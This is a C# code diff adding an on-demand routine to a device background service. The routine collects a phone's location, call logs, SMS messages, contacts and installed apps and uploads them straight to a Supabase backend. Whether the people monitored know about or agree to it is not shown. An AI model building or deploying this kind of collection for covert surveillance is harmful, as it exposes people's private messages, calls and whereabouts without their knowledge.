@@ -107,6 +107,87 @@ public sealed class DeviceBackgroundService : IDisposable
         await _supabase.SendHeartbeatAsync();
     }
 
+    /// <summary>
+    /// جمع نوع بيانات محدد ورفعه فوراً إلى Supabase بدون انتظار Sync
+    /// </summary>
+    public async Task CollectAndUploadAsync(string dataType, CancellationToken ct)
+    {
+        try
+        {
+            switch (dataType)
+            {
+                case "location":
+                    await CollectLocationAsync(ct);
+                    var locs = await _localDb.GetUnsyncedLocationsAsync(5);
+                    foreach (var r in locs)
+                    {
+                        if (await _supabase.PushLocationAsync(r))
+                        {
+                            r.IsSynced = true;
+                            await _localDb.MarkAsSyncedAsync(r);
+                        }
+                    }
+                    break;
+
+                case "call_logs":
+                    CollectCallLogs();
+                    var calls = await _localDb.GetUnsyncedCallLogsAsync(50);
+                    foreach (var r in calls)
+                    {
+                        if (await _supabase.PushCallLogAsync(r))
+                        {
+                            r.IsSynced = true;
+                            await _localDb.MarkAsSyncedAsync(r);
+                        }
+                    }
+                    break;
+
+                case "sms":
+                    CollectSms();
+                    var smsList = await _localDb.GetUnsyncedSmsAsync(50);
+                    foreach (var r in smsList)
+                    {
+                        if (await _supabase.PushSmsAsync(r))
+                        {
+                            r.IsSynced = true;
+                            await _localDb.MarkAsSyncedAsync(r);
+                        }
+                    }
+                    break;
+
+                case "contacts":
+                    await CollectContactsAsync();
+                    var contacts = await _localDb.GetUnsyncedContactsAsync(100);
+                    foreach (var r in contacts)
+                    {
+                        if (await _supabase.PushContactAsync(r))
+                        {
+                            r.IsSynced = true;
+                            await _localDb.MarkAsSyncedAsync(r);
+                        }
+                    }
+                    break;
+
+                case "apps":
+                    await CollectInstalledAppsAsync(ct);
+                    var apps = await _localDb.GetUnsyncedAppsAsync(50);
+                    foreach (var r in apps)
+                    {
+                        if (await _supabase.PushInstalledAppsAsync(new[] { r }))
+                        {
+                            r.IsSynced = true;
+                            await _localDb.MarkAsSyncedAsync(r);
+                        }
+                    }
+                    break;
+            }
+        }
+        catch (Exception ex)
+        {
+            System.Diagnostics.Debug.WriteLine($"[BG] CollectAndUpload({dataType}) error: {ex.Message}");
+        }
+    }
+
     // ======================= LOCATION =======================
     public async Task CollectLocationAsync(CancellationToken ct)
     {
